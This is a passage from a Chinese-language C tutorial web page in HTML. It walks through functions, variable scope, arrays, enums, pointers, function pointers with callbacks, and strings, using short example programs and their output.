函数返回两个数中较大的那个数 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量声明 */</span></span><br><span class="line">   <span class="keyword">int</span> result;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">      result = num1;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      result = num2;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把 max() 函数和 main() 函数放一块，编译源代码。当运行最后的可执行文件时，会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Max value is : <span class="number">200</span></span><br></pre></td></tr></table></figure><h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><p>如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的<strong>形式参数</strong>。</p><p>形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。</p><p>当调用函数时，有两种向函数传递参数的方式：</p><table><thead><tr><th align="left">调用类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-function-call-by-value.html">传值调用</a></td><td align="left">该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数不会影响实际参数。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-function-call-by-pointer.html">引用调用</a></td><td align="left">通过指针传递方式，形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作。</td></tr></tbody></table><p>默认情况下，C 使用<strong>传值调用</strong>来传递参数。一般来说，这意味着函数内的代码不能改变用于调用函数的实际参数。</p><h2 id="C-作用域规则"><a href="#C-作用域规则" class="headerlink" title="C    作用域规则"></a>C    作用域规则</h2><p>任何一种编程中，作用域是程序中定义的变量所存在的区域，超过该区域变量就不能被访问。C 语言中有三个地方可以声明变量：</p><ol><li>在函数或块内部的<strong>局部</strong>变量</li><li>在所有函数外部的<strong>全局</strong>变量</li><li>在<strong>形式</strong>参数的函数参数定义中</li></ol><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p> 在某个函数或块的内部声明的变量称为局部变量。它们只能被该函数或该代码块内部的语句使用。局部变量在函数外部是不可知的。 </p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p> 全局变量是定义在函数外部，通常是在程序的顶部。全局变量在整个程序生命周期内都是有效的，在任意的函数内部能访问全局变量。 </p><h4 id="形式参数"><a href="#形式参数" class="headerlink" title="形式参数"></a>形式参数</h4><p> 函数的参数，形式参数，被当作该函数内的局部变量，如果与全局变量同名它们会优先使用。 </p><p><strong>全局变量与局部变量在内存中的区别</strong>：</p><ul><li>全局变量保存在内存的全局存储区中，占用静态的存储单元；</li><li>局部变量保存在栈中，只有在所在函数被调用时才动态地为变量分配存储单元。</li></ul><h4 id="初始化局部变量和全局变量"><a href="#初始化局部变量和全局变量" class="headerlink" title="初始化局部变量和全局变量"></a>初始化局部变量和全局变量</h4><p>当局部变量被定义时，系统不会对其初始化，您必须自行对其初始化。定义全局变量时，系统会自动对其初始化，如下所示：</p><table><thead><tr><th align="left">数据类型</th><th align="left">初始化默认值</th></tr></thead><tbody><tr><td align="left">int</td><td align="left">0</td></tr><tr><td align="left">char</td><td align="left">‘\0’</td></tr><tr><td align="left">float</td><td align="left">0</td></tr><tr><td align="left">double</td><td align="left">0</td></tr><tr><td align="left">pointer</td><td align="left">NULL</td></tr></tbody></table><h2 id="C-数组"><a href="#C-数组" class="headerlink" title="C    数组"></a>C    数组</h2><p> C 语言支持<strong>数组</strong>数据结构，它可以存储一个固定大小的相同类型元素的顺序集合。数组是用来存储一系列数据，但它往往被认为是一系列相同类型的变量。 </p><h3 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h3><p>在 C 中要声明一个数组，需要指定元素的类型和元素的数量，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type arrayName [ arraySize ];</span><br></pre></td></tr></table></figure><p> 这叫做一维数组。<strong>arraySize</strong> 必须是一个大于零的整数常量，<strong>type</strong> 可以是任意有效的 C 数据类型。例如，要声明一个类型为 double 的包含 10 个元素的数组 <strong>balance</strong>，声明语句如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> balance[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><h3 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> balance[<span class="number">5</span>] = &#123;<span class="number">1000.0</span>, <span class="number">2.0</span>, <span class="number">3.4</span>, <span class="number">7.0</span>, <span class="number">50.0</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">balance[<span class="number">4</span>] = <span class="number">50.0</span>;</span><br></pre></td></tr></table></figure><h3 id="C-中数组详解"><a href="#C-中数组详解" class="headerlink" title="C 中数组详解"></a>C 中数组详解</h3><p>在 C 中，数组是非常重要的，我们需要了解更多有关数组的细节。下面列出了 C 程序员必须清楚的一些与数组相关的重要概念：</p><table><thead><tr><th align="left">概念</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-multi-dimensional-arrays.html">多维数组</a></td><td align="left">C 支持多维数组。多维数组最简单的形式是二维数组。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-passing-arrays-to-functions.html">传递数组给函数</a></td><td align="left">您可以通过指定不带索引的数组名称来给函数传递一个指向数组的指针。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-return-arrays-from-function.html">从函数返回数组</a></td><td align="left">C 允许从函数返回数组。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-pointer-to-an-array.html">指向数组的指针</a></td><td align="left">您可以通过指定不带索引的数组名称来生成一个指向数组中第一个元素的指针。</td></tr></tbody></table><h2 id="C-枚举"><a href="#C-枚举" class="headerlink" title="C    枚举"></a>C    枚举</h2><p>枚举是 C 语言中的一种基本数据类型，它可以让数据更简洁，更易读。</p><p>枚举语法定义格式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span>　枚举名　&#123;枚举元素<span class="number">1</span>,枚举元素<span class="number">2</span>,……&#125;;</span><br></pre></td></tr></table></figure><p>接下来我们举个例子，比如：一星期有 7 天，如果不用枚举，我们需要使用 #define 来为每个整数定义一个别名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MON  1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TUE  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WED  3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THU  4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FRI  5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAT  6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN  7</span></span><br></pre></td></tr></table></figure><p>这个看起来代码量就比较多，接下来我们看看使用枚举的方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> DAY</span><br><span class="line">&#123;</span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">enum</span> DAY</span><br><span class="line">&#123;</span><br><span class="line">      MON=<span class="number">1</span>, TUE, WED, THU, FRI, SAT, SUN</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">enum</span> DAY day;</span><br><span class="line">    day = WED;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,day);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上实例输出结果为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="C-指针"><a href="#C-指针" class="headerlink" title="C    指针"></a>C    指针</h2><p> 每一个变量都有一个内存位置，每一个内存位置都定义了可使用连字号（&amp;）运算符访问的地址，它表示了在内存中的一个地址。请看下面的实例，它将输出定义的变量地址： </p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  var1;</span><br><span class="line">   <span class="keyword">char</span> var2[<span class="number">10</span>];</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"var1 变量的地址： %p\n"</span>, &amp;var1  );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"var2 变量的地址： %p\n"</span>, &amp;var2  );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 变量的地址： <span class="number">0x7fff5cc109d4</span></span><br><span class="line">var2 变量的地址： <span class="number">0x7fff5cc109de</span></span><br></pre></td></tr></table></figure><h3 id="什么是指针？"><a href="#什么是指针？" class="headerlink" title="什么是指针？"></a>什么是指针？</h3><p><strong>指针</strong>是一个变量，其值为另一个变量的地址，即，内存位置的直接地址。就像其他变量或常量一样，您必须在使用指针存储其他变量地址之前，对其进行声明。指针变量声明的一般形式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type *var-name;</span><br></pre></td></tr></table></figure><p>在这里，<strong>type</strong> 是指针的基类型，它必须是一个有效的 C 数据类型，<strong>var-name</strong> 是指针变量的名称。用来声明指针的星号 * 与乘法中使用的星号是相同的。但是，在这个语句中，星号是用来指定一个变量是指针。以下是有效的指针声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>    *ip;    <span class="comment">/* 一个整型的指针 */</span></span><br><span class="line"><span class="keyword">double</span> *dp;    <span class="comment">/* 一个 double 型的指针 */</span></span><br><span class="line"><span class="keyword">float</span>  *fp;    <span class="comment">/* 一个浮点型的指针 */</span></span><br><span class="line"><span class="keyword">char</span>   *ch;     <span class="comment">/* 一个字符型的指针 */</span></span><br></pre></td></tr></table></figure><p>所有实际数据类型，不管是整型、浮点型、字符型，还是其他的数据类型，对应指针的值的类型都是一样的，都是一个代表内存地址的长的十六进制数。</p><p>不同数据类型的指针之间唯一的不同是，指针所指向的变量或常量的数据类型不同。</p><h3 id="如何使用指针？"><a href="#如何使用指针？" class="headerlink" title="如何使用指针？"></a>如何使用指针？</h3><p> 使用指针时会频繁进行以下几个操作：定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值。这些是通过使用一元运算符 ***** 来返回位于操作数所指定地址的变量的值。下面的实例涉及到了这些操作： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  var = <span class="number">20</span>;   <span class="comment">/* 实际变量的声明 */</span></span><br><span class="line">   <span class="keyword">int</span>  *ip;        <span class="comment">/* 指针变量的声明 */</span></span><br><span class="line"> </span><br><span class="line">   ip = &amp;var;  <span class="comment">/* 在指针变量中存储 var 的地址 */</span></span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Address of var variable: %p\n"</span>, &amp;var  );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 在指针变量中存储的地址 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Address stored in ip variable: %p\n"</span>, ip );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 使用指针访问值 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of *ip variable: %d\n"</span>, *ip );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Address of var variable: bffd8b3c</span><br><span class="line">Address stored in ip variable: bffd8b3c</span><br><span class="line">Value of *ip variable: <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="C-中的-NULL-指针"><a href="#C-中的-NULL-指针" class="headerlink" title="C 中的 NULL 指针"></a>C 中的 NULL 指针</h3><p>在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为<strong>空</strong>指针。</p><p>NULL 指针是一个定义在标准库中的值为零的常量。请看下面的程序：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  *ptr = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"ptr 的地址是 %p\n"</span>, ptr  );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr 的地址是 <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>在大多数的操作系统上，程序不允许访问地址为 0 的内存，因为该内存是操作系统保留的。然而，内存地址 0 有特别重要的意义，它表明该指针不指向一个可访问的内存位置。但按照惯例，如果指针包含空值（零值），则假定它不指向任何东西。</p><p>如需检查一个空指针，您可以使用 if 语句，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ptr)     <span class="comment">/* 如果 p 非空，则完成 */</span></span><br><span class="line"><span class="keyword">if</span>(!ptr)    <span class="comment">/* 如果 p 为空，则完成 */</span></span><br></pre></td></tr></table></figure><h3 id="C-指针详解"><a href="#C-指针详解" class="headerlink" title="C 指针详解"></a>C 指针详解</h3><p>在 C 中，有很多指针相关的概念，这些概念都很简单，但是都很重要。下面列出了 C 程序员必须清楚的一些与指针相关的重要概念：</p><table><thead><tr><th align="left">概念</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-pointer-arithmetic.html">指针的算术运算</a></td><td align="left">可以对指针进行四种算术运算：++、–、+、-</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-array-of-pointers.html">指针数组</a></td><td align="left">可以定义用来存储指针的数组。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-pointer-to-pointer.html">指向指针的指针</a></td><td align="left">C 允许指向指针的指针。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-passing-pointers-to-functions.html">传递指针给函数</a></td><td align="left">通过引用或地址传递参数，使传递的参数在调用函数中被改变。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-return-pointer-from-functions.html">从函数返回指针</a></td><td align="left">C 允许函数返回指针到局部变量、静态变量和动态内存分配。</td></tr></tbody></table><h2 id="C-函数指针与回调函数"><a href="#C-函数指针与回调函数" class="headerlink" title="C    函数指针与回调函数"></a>C    函数指针与回调函数</h2><h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><p>函数指针是指向函数的指针变量。</p><p>通常我们说的指针变量是指向一个整型、字符型或数组等变量，而函数指针是指向函数。</p><p>函数指针可以像一般函数一样，用于调用函数、传递参数。</p><p>函数指针变量的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*fun_ptr)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>; <span class="comment">// 声明一个指向同样参数、返回值的函数指针类型</span></span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* p 是函数指针 */</span></span><br><span class="line">    <span class="keyword">int</span> (* p)(<span class="keyword">int</span>, <span class="keyword">int</span>) = &amp; <span class="built_in">max</span>; <span class="comment">// &amp;可以省略</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c, d;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入三个数字:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp; a, &amp; b, &amp; c);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 与直接调用函数等价，d = max(max(a, b), c) */</span></span><br><span class="line">    d = p(p(a, b), c); </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最大的数字是: %d\n"</span>, d);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行，输出结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入三个数字:<span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">最大的数字是: <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><strong>函数指针作为某个函数的参数</strong></p><p>函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。</p><p>简单讲：回调函数是由别人的函数执行时调用你实现的函数。</p><p>以下是来自知乎作者常溪玲的解说：</p><p><em>你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。</em></p><p><strong>实例：</strong></p><p>实例中 populate_array 函数定义了三个参数，其中第三个参数是函数的指针，通过该函数来设置数组的值。</p><p>实例中我们定义了回调函数 getNextRandomValue，它返回一个随机值，它作为一个函数指针传递给 populate_array 函数。</p><p>populate_array 将调用 10 次回调函数，并将回调函数的返回值赋值给数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate_array</span><span class="params">(<span class="keyword">int</span> *<span class="built_in">array</span>, <span class="keyword">size_t</span> arraySize, <span class="keyword">int</span> (*getNextValue)(<span class="keyword">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i=<span class="number">0</span>; i&lt;arraySize; i++)</span><br><span class="line">        <span class="built_in">array</span>[i] = getNextValue();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取随机值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getNextRandomValue</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rand();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> myarray[<span class="number">10</span>];</span><br><span class="line">    populate_array(myarray, <span class="number">10</span>, getNextRandomValue);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, myarray[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行，输出结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16807</span> <span class="number">282475249</span> <span class="number">1622650073</span> <span class="number">984943658</span> <span class="number">1144108930</span> <span class="number">470211272</span> <span class="number">101027544</span> <span class="number">1457850878</span> <span class="number">1458777923</span> <span class="number">2007237709</span></span><br></pre></td></tr></table></figure><h2 id="C-字符串"><a href="#C-字符串" class="headerlink" title="C    字符串"></a>C    字符串</h2><p> 在 C 语言中，字符串实际上是使用 <strong>null</strong> 字符 ‘\0’ 终止的一维字符数组。因此，一个以 null 结尾的字符串，包含了组成字符串的字符。 </p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> greeting[<span class="number">6</span>] = &#123;<span class="string">'H'</span>, <span class="string">'e'</span>, <span class="string">'l'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'\0'</span>&#125;;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Greeting message: %s\n"</span>, greeting );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Greeting message: Hello</span><br></pre></td></tr></table></figure><p>C 中有大量操作字符串的函数：</p><table><thead><tr><th align="left">序号</th><th align="left">函数 &amp; 目的</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>strcpy(s1, s2);</strong> 复制字符串 s2 到字符串 s1。</td></tr><tr><td align="left">2</td><td align="left"><strong>strcat(s1, s2);</strong> 连接字符串 s2 到字符串 s1 的末尾。</td></tr><tr><td align="left">3</td><td align="left"><strong>strlen(s1);</strong> 返回字符串 s1 的长度。</td></tr><tr><td align="left">4</td><td align="left"><strong>strcmp(s1, s2);</strong> 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。</td></tr><tr><td align="left">5</td><td align="left"><strong>strchr(s1, ch);</strong> 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</td></tr><tr><td align="left">6</td><td align="left"><strong>strstr(s1, s2);</strong> 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span 